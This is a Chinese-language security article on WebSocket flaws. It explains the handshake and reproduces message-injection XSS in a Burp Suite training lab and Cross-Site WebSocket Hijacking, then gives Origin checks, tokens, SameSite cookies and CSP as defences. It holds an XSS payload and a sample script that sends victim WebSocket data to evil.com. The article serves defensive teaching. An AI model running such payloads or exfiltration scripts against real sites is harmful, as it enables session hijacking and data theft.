---
title: 深入分析WebSocket协议漏洞：XSS消息注入与跨站WebSocket劫持(CSWSH)
description: 基于无名安全团队归档文章整理，系统剖析WebSocket协议握手流程、消息传递机制，重点复现XSS消息注入与跨站WebSocket劫持(CSWSH)两大核心漏洞的攻击原理、实战步骤及防御对策。
category: program-analysis
tags:
- WebSocket
- XSS
- CSWSH
- Cross-Site WebSocket Hijacking
- Web Security
- Burp Suite
- 无名安全团队
date: '2023-04-16'
updated: '2026-11-14'
---

## WebSocket 协议基础

### 协议背景与特性

WebSocket 是 HTML5 推出的应用层协议，与 HTTP 协议本身无关。为解决 HTTP 非持久连接导致的实时通信难题（早期依赖轮询 Polling 和 Comet 技术，复杂度高、资源消耗大），WebSocket 提供了全双工、长连接的通信能力：

- **全双工通信**：建立连接后，服务器与客户端均可主动发送/接收数据。
- **持久连接**：连接通常长期存在，消息可随时双向传递。
- **协议切换**：通过 HTTP 握手升级，协议从 `http://`/`https://` 切换为 `ws://`/`wss://`。

### 连接建立流程

#### 客户端发起握手

浏览器通过 JavaScript 创建连接：

```javascript
var ws = new WebSocket("wss://normal-website.com/chat");
```

握手请求示例：

```http
GET /chat HTTP/1.1
Host: normal-website.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: https://normal-website.com
```

关键请求头说明：

| 请求头 | 说明 |
| :--- | :--- |
| `Upgrade: websocket` | 标识请求协议升级为 WebSocket |
| `Connection: Upgrade` | 配合 Upgrade 头完成协议切换 |
| `Sec-WebSocket-Key` | Base64 编码的随机值，每次握手随机生成，防止缓存误导 |
| `Sec-WebSocket-Version` | 协议版本，现标准为 13 |
| `Origin` | 标识请求来源域，服务端可据此进行同源策略校验 |

#### 服务端响应握手

接受连接时返回 `101 Switching Protocols`：

```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

握手成功后，TCP 连接保持打开，进入 WebSocket 数据帧传输阶段。

## 核心漏洞一：WebSocket 消息注入导致的 XSS

### 攻击原理

WebSocket 消息若在服务端或客户端缺乏输入校验与输出编码，攻击者可注入恶意脚本。当消息被其他用户接收并在浏览器渲染时，脚本执行，形成**存储型/反射型 XSS**（视消息是否持久化而定）。

### 实战复现（基于 Burp Suite Academy 靶场）

#### 场景描述

某聊天应用使用 WebSocket 传输消息。用户输入内容经前端编码后发送，服务端广播给在线用户，前端直接插入 DOM 渲染。

#### 攻击步骤

1.  **拦截 WebSocket 消息**：使用 Burp Suite Proxy 拦截 WebSocket 历史记录（`WebSockets` 标签页）。
2.  **定位消息载荷**：正常消息格式如下：
    ```json
    {"message":"normal user input"}
    ```
3.  **构造 XSS Payload**：修改 `message` 字段注入 HTML/JS 代码。因前端输入框会编码尖括号，需抓包绕过前端过滤。
    ```json
    {"message":"<img src=1 onerror=alert(document.domain)>"}
    ```
4.  **转发修改后的消息**：放行修改后的帧。
5.  **验证触发**：目标用户聊天窗口渲染消息时，`onerror` 事件触发，弹窗执行。

#### 复现截图关键节点

- **修改前消息**：前端编码后的普通文本。
- **抓包修改**：在 Burp 中将 `message` 值替换为 Payload。
- **成功触发**：受害者浏览器弹出 `alert` 框，证明任意 JS 执行。

### 防御对策

1.  **服务端消息内容过滤/转义**：对通过 WebSocket 接收的用户数据，按输出上下文（HTML, JS, Attribute）进行实体编码或富文本安全过滤（如 DOMPurify）。
2.  **客户端安全渲染**：前端使用 `textContent` 而非 `innerHTML` 展示用户消息；若需富文本，需配置严格 CSP 并使用成熟消毒库。
3.  **内容安全策略 (CSP)**：部署严格 CSP（`script-src 'self'` 等），限制内联脚本执行，降低 XSS 影响面。

## 核心漏洞二：跨站 WebSocket 劫持 (CSWSH)

### 攻击原理

WebSocket 握手阶段复用 HTTP Cookie 进行身份认证，但 **WebSocket 规范未强制要求同源策略 (SOP)**。若服务端未校验握手请求中的 `Origin` 头，攻击者可诱导已登录受害者访问恶意页面，该页面发起跨域 WebSocket 连接至目标站点。浏览器自动携带 Cookie 完成认证，攻击者即获得受害者身份的 WebSocket 通道。

### 攻击流程

1.  受害者登录目标应用 `target.com`，获取会话 Cookie。
2.  受害者访问攻击者控制的恶意页面 `evil.com`。
3.  `evil.com` 页面执行 JS 代码：
    ```javascript
    var ws = new WebSocket("wss://target.com/chat");
    ws.onopen = function() { ws.send('{"action":"read_secret"}'); };
    ws.onmessage = function(e) { fetch('https://evil.com/steal?data=' + btoa(e.data)); };
    ```
4.  浏览器发起握手，自动附带 `target.com` Cookie。
5.  目标服务端未校验 `Origin: https://evil.com`，握手成功。
6.  攻击者通过建立的 WebSocket 连接，以受害者身份发送指令、接收敏感数据。

### 危害影响

| 影响维度 | 具体后果 |
| :--- | :--- |
| **未授权操作** | 伪装受害者发送消息、修改设置、执行敏感业务逻辑（转账、改密等）。 |
| **敏感数据窃取** | 拦截服务端主动推送的实时数据（通知、聊天记录、股票行情、个人信息）。 |
| **会话劫持延伸** | 结合其他漏洞（如消息注入 XSS）可进一步植入持久化后门。 |

### 防御对策

1.  **严格校验 Origin 头**：
    - 服务端在握手阶段强制比对 `Origin` 头与允许域名白名单。
    - 拒绝 `Origin` 为空、不在白名单或为 `null` 的跨域请求。
    - *注意*：非浏览器客户端（如原生 App、脚本）可能不发送 `Origin`，需结合 Token 机制兼容。
2.  **引入随机认证 Token (CSRF Token for WebSocket)**：
    - 握手 URL 或首条消息中携带不可预测的用户级 Token（如 `wss://target.com/chat?token=random123`）。
    - 服务端校验 Token 有效性及归属用户，绕过 Cookie 自动发送机制。
3.  **同站请求伪造 (CSRF) 防护最佳实践迁移**：
    - 对状态变更类 WebSocket 操作（发送消息、订阅频道）要求二次确认或携带 Token。
    - 设置 Cookie `SameSite: Strict` 或 `Lax`（现代浏览器对 WebSocket 握手亦生效），阻断跨站 Cookie 发送。

## 综合防御检查清单

| 防御层面 | 措施 | 关键点 |
| :--- | :--- | :--- |
| **握手认证** | `Origin` 校验 + 随机 Token 双重验证 | 防御 CSWSH 核心手段 |
| **消息处理** | 输入验证 + 输出编码 (Context-Aware) | 防御 XSS/注入核心手段 |
| **传输安全** | 强制 `wss://` (TLS) | 防止中间人窃听/篡改帧 |
| **会话管理** | Cookie `Secure; HttpOnly; SameSite=Strict` | 降低 Cookie 被滥用风险 |
| **客户端渲染** | `textContent` / DOMPurify / 严格 CSP | 纵深防御 XSS 利用 |
| **监控审计** | 记录握手 `Origin`、异常消息频率、敏感操作审计日志 | 事后溯源与异常检测 |

## 相关知识关联

- [[ettercap-arp-mitm-practical-guide]]：同属无名安全团队输出，涉及中间人攻击视角下的流量劫持，可对比 WebSocket 劫持与 ARP 劫持的异同。
- [[edu-src-penetration-test-case-study]]：实战渗透案例中涉及存储型 XSS 挖掘，可参考其漏洞验证与上报流程。
- [[race-condition-vulnerability-analysis]]：并发场景下的状态竞争，WebSocket 多标签页连接时亦可能存在竞争条件导致的逻辑漏洞。
- [[phishing-website-creation-tutorial]]：钓鱼页面制作教程，CSWSH 攻击常依赖恶意页面诱导受害者访问，属于社会工程学配合技术漏洞的典型场景。

## 参考来源

- 原文：无名安全团队公众号文章《深入研究WebSocket_WebSocket漏洞》（作者：Ben）
- 实验环境：Burp Suite Academy WebSocket 漏洞靶场

## 来源

- [0x00实验室-202108-202304_063](../sources/0x00实验室-202108-202304_063.md)
